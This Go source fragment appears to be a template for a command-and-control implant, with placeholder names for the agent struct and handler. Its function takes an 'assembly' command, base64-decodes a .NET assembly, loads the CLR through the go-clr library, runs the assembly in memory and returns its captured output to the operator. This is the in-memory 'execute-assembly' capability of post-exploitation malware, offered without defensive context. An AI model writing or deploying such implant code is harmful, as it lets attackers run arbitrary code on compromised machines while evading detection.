import (
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/Ne0nd0g/go-clr"
)

// .NET assembly execution functionality
func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) < 2 {
		return "[ERROR] Invalid assembly command format. Usage: assembly <base64_encoded_assembly>"
	}

	encodedAssembly := parts[1]

	assemblyBytes, err := base64.StdEncoding.DecodeString(encodedAssembly)
	if err != nil {
		return fmt.Sprintf("[ERROR] Invalid assembly data format: %v", err)
	}

	// Load the CLR runtime first
	rtHost, err := clr.LoadCLR("v4")
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to load CLR: %v", err)
	}

	// Redirect stdout/stderr to capture output from the .NET assembly
	err = clr.RedirectStdoutStderr()
	if err != nil {
		// Continue execution even if redirect fails, just log the error
	}

	// Load and execute the assembly using LoadAssembly/InvokeAssembly approach
	assembly, err := clr.LoadAssembly(rtHost, assemblyBytes)
	if err != nil {
		rtHost.Release()
		return fmt.Sprintf("[ERROR] Failed to load assembly: %v", err)
	}

	// Execute the assembly
	stdout, stderr := clr.InvokeAssembly(assembly, []string{})

	// Release resources
	assembly.Release()
	rtHost.Release()

	// Return the output
	output := stdout
	if stderr != "" {
		if output != "" {
			output += "\n"
		}
		output += "[STDERR] " + stderr
	}

	if output == "" {
		return "[SUCCESS] .NET assembly executed with no output"
	}

	return output
}